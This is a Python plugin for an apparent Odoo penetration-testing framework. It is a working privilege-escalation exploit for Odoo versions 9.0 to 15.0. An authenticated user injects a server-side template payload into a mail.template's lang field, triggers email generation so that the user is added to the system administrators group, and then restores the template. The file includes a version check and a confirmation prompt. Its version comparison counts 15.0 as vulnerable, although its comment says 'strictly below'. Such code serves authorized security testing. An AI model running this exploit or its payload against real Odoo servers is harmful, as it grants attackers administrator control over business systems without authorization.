from enum import Enum
import re
from ..colors import Colors
from .plugin_base import BasePlugin, PluginMetadata, PluginCategory

class VulnerableStatus(Enum):
    VULNERABLE = 1
    UNKNOWN = 2
    NOT_VULNERABLE = 3

class Plugin(BasePlugin):
    """Exploit in Odoo allowing any authenticated user to
    execute 'some' arbitrary python code on the server.
    Thus changing their own groups.

    By Guilhem RIOUX (@jrjgjk)
    Orange Cyberdefense
    """
    MAX_VERSION = "15.0" # striclty below
    MIN_VERSION = "9.0"

    def __init__(self):
        super().__init__()
        self.connection = None
        self.model = "res.users"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="Privilege escalation for old odoo versions",
            description="Try to escalate privileges of " +\
                "the current user, target odoo < 15.0",
            author="jrjgjk",
            version="1.0.0",
            category=PluginCategory.EXPLOITATION,
            requires_auth=True,
            requires_connection=True,
            external_dependencies=[""]
        )

    @classmethod
    def parse_version(cls, version_str):
        """Convert a version string like '14.0' into a tuple (14,0)"""
        return tuple(int(x) for x in version_str.split(".") if x.isdigit())

    @classmethod
    def is_version_vulnerable(cls, version):
        """
        Compare the version of the target with those
        stored on the class fields (no external packages needed)
        """
        if isinstance(version, str):
            version = cls.parse_version(version)

        min_v = cls.parse_version(cls.MIN_VERSION)
        max_v = cls.parse_version(cls.MAX_VERSION)

        return min_v < version <= max_v

    @staticmethod
    def get_payload():
        """
        Return the payload that will be injected inside
        an Odoo mail template
        """
        payload = '${ object.sudo().write({"groups_id": [(4, object.sudo().env.ref("base.group_system").id)]}) }'
        return payload

    def get_values_to_write(self):
        """
        Get the dictionary of values that will be written
        to the `mail.template` table
        """
        return {"lang": self.__class__.get_payload(),
                "model": self.model}

    def _is_module_loaded(self):
        """
        Check if the module is loaded
        """
        try:
            self.connection.models.execute_kw(
                self.connection.db, self.connection.uid, self.connection.password,
                "mail.template", 'search', [[]], {'limit': 1})
        except Exception as e:
            return False
        return True

    def check(self, db, username, password):
        """
        Check if the target is vulnerable.

        A target is considered vulnerable if:
          1. Its Odoo version is within the vulnerable range.
          2. The 'mail' module is loaded.
          3. The current user can edit the `mail.template` table.
        """

        if not self.connection.authenticate(db, username, password):
            exit(0)

        if not self._is_module_loaded():
            return VulnerableStatus.NOT_VULNERABLE, "Mail module is not loaded"

        version_info = self.connection.get_version()
        if not version_info or not version_info.get("server_version"):
            return VulnerableStatus.UNKNOWN, "Could not determine Odoo version"

        raw_version = version_info.get("server_version")
        match = re.search(r'(\d+(\.\d+)*)', str(raw_version))
        version = match.group(1) if match else None

        if not version:
            return VulnerableStatus.UNKNOWN, "Failed to parse Odoo version"

        if self.__class__.is_version_vulnerable(version):
            return VulnerableStatus.VULNERABLE, f"(Version {version})"
        
        return VulnerableStatus.NOT_VULNERABLE, f"Version {version} is not vulnerable"

    def run(self,
            target_url,
            database=None,
            username=None,
            password=None,
            connection=None):
        """
        Run the plugin and try to add your user into
        the admin's group
        """
        self.connection = connection
        if not self.validate_requirements(self.connection, username, password):
            print(f"{Colors.e} This plugin requires authentication")
            return "Failed"

        vulnerability_status, reason = self.check(database, username, password)
        if vulnerability_status is VulnerableStatus.NOT_VULNERABLE:
            print(f"{Colors.e} Target is not vulnerable: {reason}")
            return "Failed"

        if vulnerability_status is VulnerableStatus.UNKNOWN:
            print(f"{Colors.w} Vulnerability unknown: {reason}")
        else:
            print(f"{Colors.s} Target is vulnerable: {reason}")


        run_exploit = input("Continue exploit? [y/N]: ").strip().lower()
        if run_exploit not in ('y', 'yes'):
            print(f"{Colors.w} Aborting exploit")
            return "Aborted"

        print(f"{Colors.i} Updating `mail_template`.lang table")

        ### 1. Find a backdoorable template id ###
        old_lang, old_model = None, None
        template_id = 0
        for i in range(1, 32):
            res = self.connection.models.execute_kw(
                                         self.connection.db,
                                         self.connection.uid,
                                         self.connection.password,
                                         'mail.template', 'read',
                                         [i, ["id", "lang", "model"]])
            if res:
                old_lang = res[0].get("lang")
                old_model = res[0].get("model")
                template_id = res[0].get("id")
                print(f"{Colors.i} Old values lang: {old_lang}, "
                      f"model: {old_model}, id: {template_id}")
                break
        if old_lang is None or not template_id or not old_model:
            print(f"{Colors.e} No template available for attack")
            return None
        print(f"{Colors.i} Backdooring template {str(template_id)}")

        try:
            if self.connection.models.execute_kw(self.connection.db,
                                                 self.connection.uid,
                                                 self.connection.password,
                                                 'mail.template', 'write',
                                                 [template_id, self.get_values_to_write()]):
                print(f"{Colors.s} Payload stored, executing it")
                self.connection.models.execute_kw(self.connection.db,
                                                  self.connection.uid,
                                                  self.connection.password,
                                                  'mail.template', 'generate_email',
                                                  [template_id, self.connection.uid, ["lang"]])
                print(f"{Colors.s} You shall now be privileged")
        except Exception as e:
            print(f"{Colors.e} {str(e)}")

        finally:
            print(f"{Colors.i} Cleaning exploit")
            self.connection.models.execute_kw(self.connection.db,
                                              self.connection.uid,
                                              self.connection.password,
                                              'mail.template', 'write',
                                              [template_id, {"lang": old_lang, "model": old_model}])
        return "Success"
